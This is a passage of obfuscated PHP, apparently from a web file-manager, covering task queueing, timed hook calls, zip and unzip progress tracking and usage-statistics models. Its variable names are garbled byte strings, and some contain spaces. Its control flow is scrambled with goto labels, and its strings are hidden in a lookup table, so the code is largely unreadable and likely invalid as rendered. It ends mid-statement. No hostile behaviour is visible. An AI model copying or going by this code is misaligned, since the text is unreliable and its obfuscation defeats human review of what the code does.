public static function getAll() { $aÂ”½½ç Œ = Cache::get(self::QUEUE_DATA); Cache::removeMemory(self::QUEUE_DATA); if (!$aÂ”½½ç Œ) { return array(); } return $aÂ”½½ç Œ; } public static function setAll($B±ç©ŠÄ­”) { $dšÄ¬Ì‰³ = 3600 * 24 * 30; Cache::set(self::QUEUE_LENGTH, count($B±ç©ŠÄ­”), $dšÄ¬Ì‰³); Cache::set(self::QUEUE_DATA, $B±ç©ŠÄ­”, $dšÄ¬Ì‰³); Cache::removeMemory(self::QUEUE_LENGTH); Cache::removeMemory(self::QUEUE_DATA); } public static function clear() { self::setAll(array()); } } class TaskRun { private static $asyncAdd = false; private static $syncTask = false; public static function timeLimit($CÎ„ÉÉâä‡, $DµİÆêšêâ = 5.0) { if (!$CÎ„ÉÉâä‡) { return; } $dëá£‹Œùƒ = Cache::get($CÎ„ÉÉâä‡); if (!$dëá£‹Œùƒ || timeFloat() - floatVal($dëá£‹Œùƒ) >= $DµİÆêšêâ) { Cache::set($CÎ„ÉÉâä‡, timeFloat(), $DµİÆêšêâ * 10); return !0; } return !1; } public static function timeLimitCall($E’°°éË¸Ó, $d°ÁíóåÌ©, $AöŠŸµ¤‹‹, $C¥³ƒõÀ‰‡ = 5.0) { goto E¨µ‘³¨Ø·; e…ˆÂ”˜¼Î: if (is_array($dŒ´ƒÀ[$E’°°éË¸Ó])) { $E¦¥µĞ¯‘²[$A‹î’î¤ïñ[1580]] = $dŒ´ƒÀ[$E’°°éË¸Ó][$A‹î’î¤ïñ[1580]]; } if (is_array($dŒ´ƒÀ[$E’°°éË¸Ó])) { if (timeFloat() - $dŒ´ƒÀ[$E’°°éË¸Ó][$A‹î’î¤ïñ[1579]] < $E¦¥µĞ¯‘²[$A‹î’î¤ïñ[195]] * 0.3) { return; } $E¦¥µĞ¯‘²[$A‹î’î¤ïñ[1580]] = $dŒ´ƒÀ[$E’°°éË¸Ó][$A‹î’î¤ïñ[1580]]; } $dŒ´ƒÀ[$E’°°éË¸Ó] = $E¦¥µĞ¯‘²; goto d¼øå˜Î›; E¨µ‘³¨Ø·: $A‹î’î¤ïñ =& $_SERVER[¹Ò‹Ò¹]; if (!$E’°°éË¸Ó || !$d°ÁíóåÌ©) { return; } self::$asyncAdd = !0; goto fÈ Ã§ïä; d¼øå˜Î›: Cache::set($aÌë¯îÉ», $dŒ´ƒÀ, 60); Cache::removeMemory($aÌë¯îÉ»); write_log($A‹î’î¤ïñ[1581] . $E’°°éË¸Ó . $A‹î’î¤ïñ[67] . $d°ÁíóåÌ©, $A‹î’î¤ïñ[1575]); goto bÌŒ•©ê‘µ; fÈ Ã§ïä: $aÌë¯îÉ» = $A‹î’î¤ïñ[1578]; $dŒ´ƒÀ = Cache::get($aÌë¯îÉ», !0); $E¦¥µĞ¯‘² = array($A‹î’î¤ïñ[1579] => timeFloat(), $A‹î’î¤ïñ[1580] => timeFloat(), $A‹î’î¤ïñ[260] => $d°ÁíóåÌ©, $A‹î’î¤ïñ[1573] => $AöŠŸµ¤‹‹, $A‹î’î¤ïñ[195] => $C¥³ƒõÀ‰‡); goto e…ˆÂ”˜¼Î; bÌŒ•©ê‘µ: } public static function timeLimitCallLoop() { goto dø˜ßíºçÆ; DÇˆèİÍÃ : $F¿¬ÂÅ°ß³ = array(); foreach ($cå¨ÉŠŒ³ as $a§Œ¶šÈ => $aÖ‡—×Ÿ…) { if ($D‚Ñ’ñšˆÏ - $aÖ‡—×Ÿ…[$FÊÛìŠ±±…[1580]] > $aÖ‡—×Ÿ…[$FÊÛìŠ±±…[195]]) { $e¡Óîâä¡ = !0; try { Hook::apply($aÖ‡—×Ÿ…[$FÊÛìŠ±±…[260]], $aÖ‡—×Ÿ…[$FÊÛìŠ±±…[1573]]); write_log($FÊÛìŠ±±…[1583] . $a§Œ¶šÈ . $FÊÛìŠ±±…[67] . $aÖ‡—×Ÿ…[$FÊÛìŠ±±…[260]] . $FÊÛìŠ±±…[1584] . ACTION, $FÊÛìŠ±±…[1575]); } catch (Exception $FÔ×Ê…ÅÄß) { } continue; } $F¿¬ÂÅ°ß³[$a§Œ¶šÈ] = $aÖ‡—×Ÿ…; } if (!$e¡Óîâä¡) { return; } goto eä¡Ü¹Ù¡¿; eÙ³Ì‡¼ö‡: if (!$cå¨ÉŠŒ³ || count($cå¨ÉŠŒ³) <= 0) { return; } $e¡Óîâä¡ = !1; $D‚Ñ’ñšˆÏ = timeFloat(); goto DÇˆèİÍÃ ; dø˜ßíºçÆ: $FÊÛìŠ±±… =& $_SERVER[¹Ò‹Ò¹]; $d‘ˆš”Î = array($FÊÛìŠ±±…[1582]); $F¼˜ÃÔÂ’ = in_array(strtolower(ACTION), $d‘ˆš”Î); goto B××ÚŠÊ; B××ÚŠÊ: if (!$F¼˜ÃÔÂ’ && !self::$asyncAdd) { return; } $eÓŠ”…‰å¸ = $FÊÛìŠ±±…[1578]; $cå¨ÉŠŒ³ = Cache::get($eÓŠ”…‰å¸, !0); goto eÙ³Ì‡¼ö‡; eä¡Ü¹Ù¡¿: if (!$F¿¬ÂÅ°ß³) { return Cache::remove($eÓŠ”…‰å¸); } Cache::set($eÓŠ”…‰å¸, $F¿¬ÂÅ°ß³, 60); Cache::removeMemory($eÓŠ”…‰å¸); goto B¶„ÍÚ‹ÖÄ; B¶„ÍÚ‹ÖÄ: } public static function finished($a“’‡Ã”Æ¸, $aâ„ø¨´¼ã) { $A£Ôö¸êÚ =& $_SERVER[¹Ò‹Ò¹]; if (!self::$syncTask) { self::$syncTask = array(); } self::$syncTask[] = array($A£Ôö¸êÚ[260] => $a“’‡Ã”Æ¸, $A£Ôö¸êÚ[1573] => $aâ„ø¨´¼ã); } private static function finishedRun() { $E­Îˆ¹‘æ =& $_SERVER[¹Ò‹Ò¹]; if (!self::$syncTask) { return; } foreach (self::$syncTask as $Bï¡ï‡¶Üï) { try { Hook::apply($Bï¡ï‡¶Üï[$E­Îˆ¹‘æ[260]], $Bï¡ï‡¶Üï[$E­Îˆ¹‘æ[1573]]); } catch (Exception $câ«˜¡é) { } } } public static function autoRun() { self::finishedRun(); self::timeLimitCallLoop(); } } goto dÉ¦±µ°µ; dÉ¦±µ°µ: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { goto fğá¡ÏµÇé; bÌŠÖ†³‰¹: Hook::bind($E÷Å ÒÓìá[1064], array($this, $E÷Å ÒÓìá[1587])); $Cø®¨‹‘Ô =& $this->task; $Cø®¨‹‘Ô[$E÷Å ÒÓìá[1588]] = $E÷Å ÒÓìá[1069]; goto d×¨ß²Òñ‹; d×¨ß²Òñ‹: if (!$Cø®¨‹‘Ô[$E÷Å ÒÓìá[1410]]) { $Cø®¨‹‘Ô[$E÷Å ÒÓìá[1410]] = LNG($E÷Å ÒÓìá[1589]); } goto e×®Å˜ŸÄ²; fğá¡ÏµÇé: $E÷Å ÒÓìá =& $_SERVER[¹Ò‹Ò¹]; parent::startAfter(); Hook::bind($E÷Å ÒÓìá[1585], array($this, $E÷Å ÒÓìá[1586])); goto bÌŠÖ†³‰¹; e×®Å˜ŸÄ²: } protected function endAfter() { $C–Ñ—„¦½· =& $_SERVER[¹Ò‹Ò¹]; parent::endAfter(); Hook::unbind($C–Ñ—„¦½·[1585], array($this, $C–Ñ—„¦½·[1586])); Hook::unbind($C–Ñ—„¦½·[1064], array($this, $C–Ñ—„¦½·[1587])); } public function updateAfter() { $fç–…ÖğŸ =& $_SERVER[¹Ò‹Ò¹]; $aÂß¦×ì× =& $this->task; if (!$aÂß¦×ì×[$fç–…ÖğŸ[997]] || !$aÂß¦×ì×[$fç–…ÖğŸ[713]]) { return; } if ($aÂß¦×ì×[$fç–…ÖğŸ[1588]] == $fç–…ÖğŸ[1069]) { $d¿ìï˜ = 0; if ($aÂß¦×ì×[$fç–…ÖğŸ[1547]]) { $d¿ìï˜ = $aÂß¦×ì×[$fç–…ÖğŸ[1548]] / $aÂß¦×ì×[$fç–…ÖğŸ[1547]]; } $aÂß¦×ì×[$fç–…ÖğŸ[1505]] = $d¿ìï˜ * 0.3; } else { if ($aÂß¦×ì×[$fç–…ÖğŸ[1588]] == $fç–…ÖğŸ[309]) { $d¿ìï˜ = $aÂß¦×ì×[$fç–…ÖğŸ[1011]] / $aÂß¦×ì×[$fç–…ÖğŸ[997]]; $aÂß¦×ì×[$fç–…ÖğŸ[1505]] = 0.3 + $d¿ìï˜ * 0.4; } else { if ($aÂß¦×ì×[$fç–…ÖğŸ[1588]] == $fç–…ÖğŸ[106]) { $a“ñØ‚‹ñ = 0; if ($aÂß¦×ì×[$fç–…ÖğŸ[1549]] == $fç–…ÖğŸ[106]) { $a“ñØ‚‹ñ = $aÂß¦×ì×[$fç–…ÖğŸ[1548]]; } $d¿ìï˜ = ($aÂß¦×ì×[$fç–…ÖğŸ[1552]] + $a“ñØ‚‹ñ) / $aÂß¦×ì×[$fç–…ÖğŸ[713]]; $aÂß¦×ì×[$fç–…ÖğŸ[1505]] = 0.3 + 0.4 + $d¿ìï˜ * 0.3; } } } if ($aÂß¦×ì×[$fç–…ÖğŸ[1505]] > 0) { $DÂÀ½è—¯ó = timeFloat() - $aÂß¦×ì×[$fç–…ÖğŸ[735]] - $aÂß¦×ì×[$fç–…ÖğŸ[1508]]; $aÂß¦×ì×[$fç–…ÖğŸ[1509]] = $DÂÀ½è—¯ó * (1 - $aÂß¦×ì×[$fç–…ÖğŸ[1505]]) / $aÂß¦×ì×[$fç–…ÖğŸ[1505]]; } } public function addFile($bÊ×¼ÃßŒ¼) { goto f‘ùã¸â‹¤; f‘ùã¸â‹¤: $DŠÇÃÛ ³› =& $_SERVER[¹Ò‹Ò¹]; $D•šËƒÉ =& $this->task; $B°‘ª°à×à = IO::info($bÊ×¼ÃßŒ¼); goto Eš†“µ‚ƒ™; D³¤¨ÎÑÆ‡: $D•šËƒÉ[$DŠÇÃÛ ³›[997]] = 1; $B˜¶‡Õ£Ë‹ = 0; $D•šËƒÉ[$DŠÇÃÛ ³›[1556]] = array($DŠÇÃÛ ³›[1557] => $B˜¶‡Õ£Ë‹ + 1, $DŠÇÃÛ ³›[407] => $B°‘ª°à×à[$DŠÇÃÛ ³›[28]], $DŠÇÃÛ ³›[75] => $B°‘ª°à×à[$DŠÇÃÛ ³›[75]], $DŠÇÃÛ ³›[489] => $B°‘ª°à×à[$DŠÇÃÛ ³›[489]] ? $B°‘ª°à×à[$DŠÇÃÛ ³›[489]] : $B°‘ª°à×à[$DŠÇÃÛ ³›[75]]); goto aë§Û‡†Áõ; b†ĞÖÈ¯Š¢: $D•šËƒÉ[$DŠÇÃÛ ³›[999]] = $DŠÇÃÛ ³›[1564]; $D•šËƒÉ[$DŠÇÃÛ ³›[1549]] = $DŠÇÃÛ ³›[1069]; $D•šËƒÉ[$DŠÇÃÛ ³›[713]] = $B°‘ª°à×à[$DŠÇÃÛ ³›[77]]; goto D³¤¨ÎÑÆ‡; Eš†“µ‚ƒ™: $D•šËƒÉ[$DŠÇÃÛ ³›[1545]] = $B°‘ª°à×à[$DŠÇÃÛ ³›[28]]; $D•šËƒÉ[$DŠÇÃÛ ³›[1547]] = $B°‘ª°à×à[$DŠÇÃÛ ³›[77]]; $D•šËƒÉ[$DŠÇÃÛ ³›[1548]] = 0; goto b†ĞÖÈ¯Š¢; aë§Û‡†Áõ: $this->update(); goto aÁ„™ÔÅ¸ò; aÁ„™ÔÅ¸ò: } public function unzipAfter($D¹ØÅ”×Å) { goto a‚è‚èóë; f£‘”‰¯ˆ™: if ($B¢…•‘·‘¯[$däÜºó´ƒç[29]] == $däÜºó´ƒç[191]) { $aŞ˜òäé‰[$däÜºó´ƒç[997]] = 1; } else { $aŞ˜òäé‰[$däÜºó´ƒç[997]] = $B¢…•‘·‘¯[$däÜºó´ƒç[80]][$däÜºó´ƒç[78]]; } $aŞ˜òäé‰[$däÜºó´ƒç[999]] = $däÜºó´ƒç[33]; $aŞ˜òäé‰[$däÜºó´ƒç[1549]] = 0; goto DÏß¬ë£Üˆ; a‚è‚èóë: $däÜºó´ƒç =& $_SERVER[¹Ò‹Ò¹]; $aŞ˜òäé‰ =& $this->task; $aŞ˜òäé‰[$däÜºó´ƒç[1588]] = $däÜºó´ƒç[106]; goto AÇØÜŒ²ŸÅ; fÓÒÒÁÈƒ: $this->update(); self::log($däÜºó´ƒç[1590] . json_encode(array($aŞ˜òäé‰, $B¢…•‘·‘¯))); goto D¢™ŸÓ˜¿¦; DÏß¬ë£Üˆ: $aŞ˜òäé‰[$däÜºó´ƒç[1011]] = 0; $aŞ˜òäé‰[$däÜºó´ƒç[1547]] = 0; $aŞ˜òäé‰[$däÜºó´ƒç[1548]] = 0; goto c÷Š½ÏŸÒİ; c÷Š½ÏŸÒİ: $aŞ˜òäé‰[$däÜºó´ƒç[1545]] = $däÜºó´ƒç[33]; $aŞ˜òäé‰[$däÜºó´ƒç[1552]] = 0; $aŞ˜òäé‰[$däÜºó´ƒç[713]] = $B¢…•‘·‘¯[$däÜºó´ƒç[77]]; goto fÓÒÒÁÈƒ; AÇØÜŒ²ŸÅ: $B¢…•‘·‘¯ = IO::infoWithChildren($D¹ØÅ”×Å); $Fœ‡Ğ±Ê†Á = 0; $aŞ˜òäé‰[$däÜºó´ƒç[1556]] = array($däÜºó´ƒç[1557] => $Fœ‡Ğ±Ê†Á + 1, $däÜºó´ƒç[407] => $B¢…•‘·‘¯[$däÜºó´ƒç[28]], $däÜºó´ƒç[75] => $B¢…•‘·‘¯[$däÜºó´ƒç[75]], $däÜºó´ƒç[489] => $B¢…•‘·‘¯[$däÜºó´ƒç[489]] ? $B¢…•‘·‘¯[$däÜºó´ƒç[489]] : $B¢…•‘·‘¯[$däÜºó´ƒç[75]]); goto f£‘”‰¯ˆ™; D¢™ŸÓ˜¿¦: } public function nameParse($cÖÌáì¿Íœ) { goto cÓ‰ªª˜Î; cÓ‰ªª˜Î: $d­ºã„’ã³ =& $_SERVER[¹Ò‹Ò¹]; $a‰Ğ¤‘ÒóÄ =& $this->task; if ($a‰Ğ¤‘ÒóÄ[$d­ºã„’ã³[1588]] == $d­ºã„’ã³[1069]) { $a‰Ğ¤‘ÒóÄ[$d­ºã„’ã³[1588]] = $d­ºã„’ã³[309]; $a‰Ğ¤‘ÒóÄ[$d­ºã„’ã³[1552]] = 0; $a‰Ğ¤‘ÒóÄ[$d­ºã„’ã³[713]] = 0; } goto e‚íÂ©ßƒ¨; AÉõÔ—É¯õ: $this->update(); goto cÕê£±Şå³; e‚íÂ©ßƒ¨: $FÑ‹ëêÓÊ = get_path_this($cÖÌáì¿Íœ); if (strstr($FÑ‹ëêÓÊ, $d­ºã„’ã³[94])) { $a‰Ğ¤‘ÒóÄ[$d­ºã„’ã³[1011]] += 1; $a‰Ğ¤‘ÒóÄ[$d­ºã„’ã³[997]] += 1; } $a‰Ğ¤‘ÒóÄ[$d­ºã„’ã³[1545]] = $cÖÌáì¿Íœ; goto AÉõÔ—É¯õ; cÕê£±Şå³: } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $dœºİÔâ½ =& $_SERVER[¹Ò‹Ò¹]; parent::startAfter(); Hook::bind($dœºİÔâ½[1591], array($this, $dœºİÔâ½[1586])); $AŸÜñæêœÀ =& $this->task; $AŸÜñæêœÀ[$dœºİÔâ½[1588]] = $dœºİÔâ½[1069]; if (!$AŸÜñæêœÀ[$dœºİÔâ½[1410]]) { $AŸÜñæêœÀ[$dœºİÔâ½[1410]] = LNG($dœºİÔâ½[1592]); } } protected function endAfter() { $C‚„—îëç™ =& $_SERVER[¹Ò‹Ò¹]; parent::endAfter(); Hook::unbind($C‚„—îëç™[1591], array($this, $C‚„—îëç™[1586])); } public function updateAfter() { $bóëÙÁ‹‡ê =& $_SERVER[¹Ò‹Ò¹]; $c¤ôŒÊ×Ší =& $this->task; if (!$c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[997]] || !$c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[713]]) { return; } if ($c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1588]] == $bóëÙÁ‹‡ê[1069]) { $f‰ˆ©Î¶™² = $c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1548]]; if ($c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1549]] != $bóëÙÁ‹‡ê[1069]) { $f‰ˆ©Î¶™² = 0; } $fÑ™§Ó‰œ÷ = ($c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1552]] + $f‰ˆ©Î¶™²) / $c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[713]]; $c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1505]] = $fÑ™§Ó‰œ÷ * 0.3; } else { if ($c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1588]] == $bóëÙÁ‹‡ê[309]) { $fÑ™§Ó‰œ÷ = $c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1011]] / $c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[997]]; $c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1505]] = 0.3 + $fÑ™§Ó‰œ÷ * 0.5; } else { if ($c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1588]] == $bóëÙÁ‹‡ê[106]) { $fÑ™§Ó‰œ÷ = 0; if ($c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1547]]) { $fÑ™§Ó‰œ÷ = $c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1548]] / $c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1547]]; } $c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1505]] = 0.3 + 0.5 + $fÑ™§Ó‰œ÷ * 0.2; } } } if ($c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1505]] > 0) { $aÔ§‘Ñœµˆ = timeFloat() - $c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[735]] - $c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1508]]; $c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1509]] = $aÔ§‘Ñœµˆ * (1 - $c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1505]]) / $c¤ôŒÊ×Ší[$bóëÙÁ‹‡ê[1505]]; } } public function copyFileStart($C…®ŸëÃŞÙ, $eğÓïá±Ÿ, $A…‚œùó›, $C°ÎñË¶âÒ, $Fñ„ùØ¥õö, $e‘±¹š£¬„) { $A¢‰Î­ùÙ =& $_SERVER[¹Ò‹Ò¹]; parent::copyFileStart($C…®ŸëÃŞÙ, $eğÓïá±Ÿ, $A…‚œùó›, $C°ÎñË¶âÒ, $Fñ„ùØ¥õö, $e‘±¹š£¬„); $cãíÖÕ¨ =& $this->task; if ($cãíÖÕ¨[$A¢‰Î­ùÙ[1588]] == $A¢‰Î­ùÙ[309]) { $cãíÖÕ¨[$A¢‰Î­ùÙ[1588]] = $A¢‰Î­ùÙ[106]; } $this->update(); } public function copyFileEnd($eç¶½îë†Ë, $Dğé‡»³è, $Cè’ °±¹, $eŒˆ°“Œå, $CÔ¸ÅÙ¹ç, $Cºö°Â®˜Â) { $f·Ğš¼×”‹ =& $_SERVER[¹Ò‹Ò¹]; $d¦öÀôÈ  =& $this->task; $d¦öÀôÈ [$f·Ğš¼×”‹[1548]] = $d¦öÀôÈ [$f·Ğš¼×”‹[1547]]; $d¦öÀôÈ [$f·Ğš¼×”‹[1552]] += $d¦öÀôÈ [$f·Ğš¼×”‹[1547]]; $d¦öÀôÈ [$f·Ğš¼×”‹[1549]] = $f·Ğš¼×”‹[33]; $this->update(); } public function nameParse($BÚ©¦ÅÑŸÃ) { $eŠØ£„ìÑÒ =& $_SERVER[¹Ò‹Ò¹]; $E¾‘­¬À³Ê =& $this->task; if ($E¾‘­¬À³Ê[$eŠØ£„ìÑÒ[1011]] < $E¾‘­¬À³Ê[$eŠØ£„ìÑÒ[997]]) { $A»˜˜Ó²Ãì = get_path_this($BÚ©¦ÅÑŸÃ); if (strstr($A»˜˜Ó²Ãì, $eŠØ£„ìÑÒ[94])) { $E¾‘­¬À³Ê[$eŠØ£„ìÑÒ[1011]] += 1; } } if ($E¾‘­¬À³Ê[$eŠØ£„ìÑÒ[1588]] == $eŠØ£„ìÑÒ[1069]) { $E¾‘­¬À³Ê[$eŠØ£„ìÑÒ[1588]] = $eŠØ£„ìÑÒ[309]; } $E¾‘­¬À³Ê[$eŠØ£„ìÑÒ[1545]] = $BÚ©¦ÅÑŸÃ; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($côÙ˜¢Íòã) { $b”ù‚—ÚéÖ =& $_SERVER[¹Ò‹Ò¹]; $d¾™ÈÇá’ = array($b”ù‚—ÚéÖ[557] => array($b”ù‚—ÚéÖ[29] => $b”ù‚—ÚéÖ[1593], $b”ù‚—ÚéÖ[269] => array($b”ù‚—ÚéÖ[220], $b”ù‚—ÚéÖ[715], $b”ù‚—ÚéÖ[1594], $b”ù‚—ÚéÖ[1595])), $b”ù‚—ÚéÖ[1596] => array($b”ù‚—ÚéÖ[29] => $b”ù‚—ÚéÖ[1597], $b”ù‚—ÚéÖ[269] => array($b”ù‚—ÚéÖ[220], $b”ù‚—ÚéÖ[713], $b”ù‚—ÚéÖ[1598], $b”ù‚—ÚéÖ[1599], $b”ù‚—ÚéÖ[1600]))); if (!isset($d¾™ÈÇá’[$côÙ˜¢Íòã])) { return !1; } $this->optionType = $d¾™ÈÇá’[$côÙ˜¢Íòã][$b”ù‚—ÚéÖ[29]]; $this->field = $d¾™ÈÇá’[$côÙ˜¢Íòã][$b”ù‚—ÚéÖ[269]]; return !0; } public function listData($c½ÔˆŒè = false, $Aœ†ï¸‰Ôö = "\155\157\x64\151\146\x79\124\x69\x6d\145", $f‘Á»ÉÎš· = false) { return parent::listData($c½ÔˆŒè, $Aœ†ï¸‰Ôö, $f‘Á»ÉÎš·); } public function trendList($cÙÛÔ£òäŒ) { goto b”Ÿâ”ªÌ¹; dñÍåÒøÑ: foreach ($FİùÆÍŒ¤ as $CòµÀá‡ïÇ) { $this->{$f–ÌŠéÜáì}($CòµÀá‡ïÇ); } return $this->listData(); goto e¢òìÊÃà; b”Ÿâ”ªÌ¹: $B£·¿Š‰„¥ =& $_SERVER[¹Ò‹Ò¹]; $bïŞ¡¤ñÅĞ = $this->listData(); if ($bïŞ¡¤ñÅĞ) { $E¶›í¤õò» = end($bïŞ¡¤ñÅĞ); $CòµÀá‡ïÇ = date($B£·¿Š‰„¥[1601], strtotime($B£·¿Š‰„¥[1602])); if ($E¶›í¤õò»[$B£·¿Š‰„¥[220]] == $CòµÀá‡ïÇ) { return $bïŞ¡¤ñÅĞ; } $aÓèŞ®òÈà = strtotime($E¶›í¤õò»[$B£·¿Š‰„¥[220]]); } goto böÆ‚„¬Ş²; böÆ‚„¬Ş²: if (!isset($aÓèŞ®òÈà)) { $D¯Æ ºÁäø = $cÙÛÔ£òäŒ == $B£·¿Š‰„¥[557] ? $B£·¿Š‰„¥[501] : $B£·¿Š‰„¥[769]; $aÓèŞ®òÈà = Model($D¯Æ ºÁäø)->min($B£·¿Š‰„¥[192]); } $f–ÌŠéÜáì = $B£·¿Š‰„¥[1603] . ucfirst($cÙÛÔ£òäŒ); $FİùÆÍŒ¤ = $this->dateList($aÓèŞ®òÈà); goto dñÍåÒøÑ; e¢òìÊÃà: } private function dateList($A––¶íÁğ‡) { $e½Ú®¹À“Ú =& $_SERVER[¹Ò‹Ò¹]; $f…²“è¸¦è = $A––¶íÁğ‡; $B¨”â…ñ× = strtotime($e½Ú®¹À“Ú[1602]); $D“ˆ»ˆ„ÏÅ = array(); while ($f…²“è¸¦è <= $B¨”â…ñ×) { $D“ˆ»ˆ„ÏÅ[] = date($e½Ú®¹À“Ú[1601], $f…²“è¸¦è); $f…²“è¸¦è = strtotime($e½Ú®¹À“Ú[1604], $f…²“è¸¦è); } return $D“ˆ»ˆ„ÏÅ; } public function _recordUser($FËÉº¥æ’· = '') { goto f±«©èŠ“Ã; F½½¹÷Ğ×Š: $cÊø™¶œƒ½ = array($aäÜõ†ä¢ö[192] => array($aäÜõ†ä¢ö[946], $dŒÕØ–Ü)); $c½ì›İô’ = Model($aäÜõ†ä¢ö[501])->where($cÊø™¶œƒ½)->count($aäÜõ†ä¢ö[1504]); $cÊø™¶œƒ½[$aäÜõ†ä¢ö[192]] = array($aäÜõ†ä¢ö[329], array($díÃ¿¨”¯î, $dŒÕØ–Ü)); goto cÙğæ›¬¿§; cÙğæ›¬¿§: $Bî ‰·‹ßÃ = Model($aäÜõ†ä¢ö[501])->where($cÊø™¶œƒ½)->count($aäÜõ†ä¢ö[1504]); $cÊø™¶œƒ½[$aäÜõ†ä¢ö[29]] = $aäÜõ†ä¢ö[1607]; $d×äÀ—ÔŞ´ = Model($aäÜõ†ä¢ö[1608])->where($cÊø™¶œƒ½)->count($aäÜõ†ä¢ö[1609]); goto aÔ¹ÁÎöõ±; f±«©èŠ“Ã: $aäÜõ†ä¢ö =& $_SERVER[¹Ò‹Ò¹]; $díÃ¿¨”¯î = strtotime(date($aäÜõ†ä¢ö[1605], strtotime($FËÉº¥æ’·))); $dŒÕØ–Ü = strtotime(date($aäÜõ†ä¢ö[1606], strtotime($FËÉº¥æ’·))); goto F½½¹÷Ğ×Š; aÔ¹ÁÎöõ±: $a¤ÇóŒˆÖ = array($aäÜõ†ä¢ö[220] => $FËÉº¥æ’·, $aäÜõ†ä¢ö[715] => (int) $c½ì›İô’, $aäÜõ†ä¢ö[1594] => (int) $Bî ‰·‹ßÃ, $aäÜõ†ä¢ö[1595] => (int) $d×äÀ—ÔŞ´); return $this->insert($a¤ÇóŒˆÖ); goto B¤‘‡«Ú–; B¤‘‡«Ú–: } public function _recordStore($C³±²·Ğ¦ß = '') { goto E‰¦†É†; d™‹™İÌ–Ù: $c¡Ï—õ¼ñ»[$EèãÑÛñÕ—[398]] = 1; $CÒ›ö ¦â© = Model($EèãÑÛñÕ—[769])->where($c¡Ï—õ¼ñ»)->sum($EèãÑÛñÕ—[77]); $c¡Ï—õ¼ñ»[$EèãÑÛñÕ—[398]] = 2; goto A‚³„îØØî; E‰¦†É†: $EèãÑÛñÕ— =& $_SERVER[¹Ò‹Ò¹]; $fİá‹åˆ« = strtotime(date($EèãÑÛñÕ—[1606], strtotime($C³±²·Ğ¦ß))); $c¡Ï—õ¼ñ» = array($EèãÑÛñÕ—[192] => array($EèãÑÛñÕ—[946], $fİá‹åˆ«)); goto bªÀ”äô×­; A‚³„îØØî: $B©²óËÄš„ = Model($EèãÑÛñÕ—[769])->where($c¡Ï—õ¼ñ»)->sum($EèãÑÛñÕ—[77]); $DÚ×ÌÑãğŠ = array($EèãÑÛñÕ—[220] => $C³±²·Ğ¦ß, $EèãÑÛñÕ—[713] => (int) $AÃê°ŠÖÜí, $EèãÑÛñÕ—[1598] => (int) $FİŸ‰‡ğÚ–, $EèãÑÛñÕ—[1599] => (int) $CÒ›ö ¦â©, $EèãÑÛñÕ—[1600] => (int) $B©²óËÄš„); return $this->insert($DÚ×ÌÑãğŠ); goto bô¼…«‡; bªÀ”äô×­: $FİŸ‰‡ğÚ– = Model($EèãÑÛñÕ—[444])->where($c¡Ï—õ¼ñ»)->sum($EèãÑÛñÕ—[77]); $c¡Ï—õ¼ñ»[$EèãÑÛñÕ—[397]] = 0; $AÃê°ŠÖÜí = Model($EèãÑÛñÕ—[769])->where($c¡Ï—õ¼ñ»)->sum($EèãÑÛñÕ—[77]); goto d™‹™İÌ–Ù; bô¼…«‡: } public function trend($Fë™òà÷Ô¥, $AÌ±ò•®Ç) { goto eÎ¹ùç»ò¶; DÂ™ËáÔÃ: if ($E‚¢•‘ÒÖ && $AÌ±ò•®Ç != $a¶¬ğìÈø®[1478]) { $E¬‰ã˜¡© = $E‚¢•‘ÒÖ[0][$a¶¬ğìÈø®[220]]; $DÓœ’À§ë = $this->validDate($AÌ±ò•®Ç, $E¬‰ã˜¡©); $DäËÎé²…â = array(); $cµÓˆŸôÜ = array_to_keyvalue($E‚¢•‘ÒÖ, $a¶¬ğìÈø®[220]); foreach ($DÓœ’À§ë as $A·å’†Ç¯Ñ) { if (isset($cµÓˆŸôÜ[$A·å’†Ç¯Ñ])) { $f÷…Ææ©ó = $cµÓˆŸôÜ[$A·å’†Ç¯Ñ]; } else { $f÷…Ææ©ó = end($E‚¢•‘ÒÖ); $f÷…Ææ©ó[$a¶¬ğìÈø®[220]] = $A·å’†Ç¯Ñ; if ($Fë™òà÷Ô¥ == $a¶¬ğìÈø®[557]) { $f÷…Ææ©ó[$a¶¬ğìÈø®[1594]] = $f÷…Ææ©ó[$a¶¬ğìÈø®[1595]] = 0; } } $DäËÎé²…â[] = $f÷…Ææ©ó; } $E‚¢•‘ÒÖ = $DäËÎé²…â; } $fÒÑïØè‚³ = array($a¶¬ğìÈø®[557] => array($a¶¬ğìÈø®[715] => LNG($a¶¬ğìÈø®[1610]), $a¶¬ğìÈø®[1594] => LNG($a¶¬ğìÈø®[1611]), $a¶¬ğìÈø®[1595] => LNG($a¶¬ğìÈø®[1612])), $a¶¬ğìÈø®[1596] => array($a¶¬ğìÈø®[713] => LNG($a¶¬ğìÈø®[1613]), $a¶¬ğìÈø®[1598] => LNG($a¶¬ğìÈø®[1614]), $a¶¬ğìÈø®[1599] => LNG($a¶¬ğìÈø®[1615]), $a¶¬ğìÈø®[1600] => LNG($a¶¬ğìÈø®[1616]))); $a‚äš î‰Ä = array($a¶¬ğìÈø®[557] => $a¶¬ğìÈø®[1617], $a¶¬ğìÈø®[1596] => $a¶¬ğìÈø®[77]); goto FÆ±»Â¶; FÆ±»Â¶: if (empty($E‚¢•‘ÒÖ)) { $A·å’†Ç¯Ñ = 